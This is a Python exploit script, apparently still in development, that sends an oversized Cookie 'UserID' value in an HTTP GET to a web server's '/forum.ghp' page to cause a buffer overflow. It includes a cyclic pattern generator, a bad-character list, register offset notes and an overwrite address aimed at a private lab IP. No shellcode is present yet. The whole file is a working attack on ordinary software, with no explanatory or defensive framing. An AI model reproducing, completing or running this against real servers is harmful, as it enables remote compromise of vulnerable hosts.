#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import struct
import codecs
import socket

def c(x):
  return pack('<L', x)

def pc(length):
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def junk(size):
	return "\x41"*size

badchars = "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"

host="192.168.76.128"	
port=80
buffsize = 5000
exploit = ""

# We control EDX
# ESI points to our buffer
# EDX + 28 is called
# EIP executed opcodes contained in the memory address(ESI)
# Put address in EDX that will point to ESI after conversion
# payload += pc(5000)
# EDX - 80
# EDI - 80
# ESI - 64
# ECX - 80

EAX = 4131
NSEH = 4059
ESI = 64
EDX = 80

# 200-3000

# exploit += pc(ESI)
# exploit += "\x41"*16
exploit += junk(EDX-len(exploit))
exploit += c(0x10021F85)
exploit += pc(buffsize-len(exploit))
# exploit += pc(5000)

# C085D6FF - 3229996799
# DS 0023

file = open("/Users/omaidfaizyar/Desktop/VM/badchars.bin","wb")
file.write(badchars)
file.close()
buf="GET /forum.ghp.ghp HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + exploit + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"
  
print "[*] Connecting to Host " + host + "..."
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)
     
print "[*] Sending malformed request..."
s.send(buf)
 
print "[!] Exploit has been sent!\n"
s.close()